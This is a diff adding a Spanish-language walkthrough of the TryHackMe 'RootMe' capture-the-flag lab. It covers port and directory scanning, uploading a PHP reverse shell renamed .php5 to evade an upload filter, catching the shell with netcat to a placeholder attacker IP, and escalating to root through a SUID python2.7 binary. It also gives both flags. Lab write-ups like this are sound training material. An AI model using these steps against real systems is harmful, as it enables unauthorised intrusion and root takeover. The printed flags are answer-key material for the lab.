@@ -1,0 +1,170 @@
+---
+layout: default
+---
+
+# RootMe CTF
+
+![RootMe CTF](/imagenes/RootMe.png)
+
+---
+
+## Fase 1 — Enumeración
+
+### Fase 1.1 — Nmap Port Scan
+
+**Comando ejecutado:**
+```bash
+# [MÁQUINA ATACANTE]
+nmap -sC -sV <TARGET_IP>
+```
+
+**Puertos descubiertos:**
+
+| Puerto | Servicio | Versión |
+|--------|----------|---------|
+| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu |
+| 80/tcp | HTTP | Apache 2.4.41 Ubuntu |
+
+**Hallazgos:**
+- HTTP → Título: **HackIT - Home**
+- Cookie `PHPSESSID` → aplicación PHP en el backend
+
+![fase1.1_nmap_scan.png](fase1.1_nmap_scan.png)
+
+---
+
+### Fase 1.2 — Enumeración Web con Gobuster
+
+**Comando ejecutado:**
+```bash
+# [MÁQUINA ATACANTE]
+gobuster dir -u http://<TARGET_IP> \
+             -w /usr/share/wordlists/dirb/common.txt \
+             -t 50
+```
+
+**Directorios descubiertos:**
+
+| Directorio | Status |
+|------------|--------|
+| `/panel/` | 301 🔴 → formulario de subida de archivos |
+| `/uploads/` | 301 🔴 → donde se almacenan y ejecutan los archivos |
+
+![fase1.2_gobuster.png](fase1.2_gobuster.png)
+
+---
+
+## Fase 2 — Foothold
+
+### Fase 2.1 — Preparar Reverse Shell PHP
+
+**Comando ejecutado:**
+```bash
+# [MÁQUINA ATACANTE]
+cp /usr/share/webshells/php/php-reverse-shell.php shell.php5
+nano shell.php5
+# Cambiar: $ip = '<ATTACKER_IP>' y $port = 4444
+```
+
+**Hallazgos:**
+- Extensión `.php5` para bypassear el filtro de subida que bloquea `.php` 🔴
+- IP y puerto configurados correctamente
+
+![fase2.1_shell_config.png](fase2.1_shell_config.png)
+
+---
+
+### Fase 2.2 — Upload de Shell via /panel/
+
+**URL visitada:**
+```
+http://<TARGET_IP>/panel/
+```
+
+**Pasos:**
+1. Clic en **Browse** → seleccionar `shell.php5`
+2. Clic en **Upload**
+3. Resultado: **"O arquivo foi upado com sucesso!"** ✅
+
+![fase2.2_panel_upload.png](fase2.2_panel_upload.png)
+
+---
+
+### Fase 2.3 — Ejecución de Reverse Shell
+
+**Paso 1 — Listener en Kali:**
+```bash
+# [MÁQUINA ATACANTE]
+nc -lvnp 4444
+```
+
+**Paso 2 — Ejecutar desde el navegador:**
+```
+http://<TARGET_IP>/uploads/shell.php5
+```
+
+**Hallazgos:**
+- Reverse shell recibida como `www-data` 🔴
+
+![fase2.3_reverse_shell.png](fase2.3_reverse_shell.png)
+
+---
+
+### Fase 2.4 — Estabilización y User Flag
+
+**Comandos ejecutados:**
+```bash
+# [MÁQUINA OBJETIVO]
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+find / -name "user.txt" 2>/dev/null
+cat /var/www/user.txt
+```
+
+**User Flag:**
+```
+THM{y0u_g0t_a_sh3ll}
+```
+
+![fase2.4_user_flag.png](fase2.4_user_flag.png)
+
+---
+
+## Fase 3 — Escalada de Privilegios
+
+### Fase 3.1 — Identificación del Vector PrivEsc (SUID)
+
+**Comando ejecutado:**
+```bash
+# [MÁQUINA OBJETIVO]
+find / -user root -perm /4000 2>/dev/null
+```
+
+**Hallazgo crítico:**
+
+| Binario | SUID |
+|---------|------|
+| `/usr/bin/python2.7` | **Activado** 🔴 → vector de PrivEsc via GTFOBins |
+
+![fase3.1_suid_find.png](fase3.1_suid_find.png)
+
+![fase3.1_suid_find2.png](fase3.1_suid_find2.png)
+
+---
+
+### Fase 3.2 — PrivEsc via SUID Python2.7 → Root Flag
+
+**Comandos ejecutados:**
+```bash
+# [MÁQUINA OBJETIVO]
+/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+whoami
+cat /root/root.txt
+```
+
+**Root Flag:**
+```
+THM{pr1v1l3g3_3sc4l4t10n}
+```
+
+![fase3.2_root_flag.png](fase3.2_root_flag.png)
